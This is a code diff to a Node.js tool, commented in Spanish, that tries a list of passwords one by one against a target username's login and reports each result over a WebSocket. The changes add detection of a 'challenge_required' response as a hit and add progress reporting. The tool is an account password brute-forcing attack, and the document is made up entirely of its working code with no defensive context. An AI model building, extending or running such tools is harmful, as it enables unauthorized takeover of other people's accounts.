@@ -31,6 +31,11 @@ async function testPassword(username, password) {
       return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
     }
 
+    // Detectar si la contraseña es correcta pero se requiere un desafío
+    if (error.message.includes('challenge_required')) {
+      return { success: true, password, message: 'Contraseña correcta, pero se requiere un desafío de seguridad.' };
+    }
+
     // Detectar si la contraseña es incorrecta
     if (error.message.includes('password')) {
       return { success: false, password, message: 'Contraseña incorrecta.' };
@@ -53,11 +58,15 @@ wss.on('connection', (ws) => {
       let correctPassword = null;
 
       // Probar cada contraseña línea por línea
-      for (const password of passwords) {
+      for (let i = 0; i < passwords.length; i++) {
+        const password = passwords[i];
         const result = await testPassword(username, password);
 
         // Enviar el resultado al frontend
-        ws.send(JSON.stringify(result));
+        ws.send(JSON.stringify({
+          ...result,
+          progress: { current: i + 1, total: passwords.length }, // Enviar progreso
+        }));
 
         // Si la contraseña es correcta, guardarla y detener el proceso
         if (result.success) {
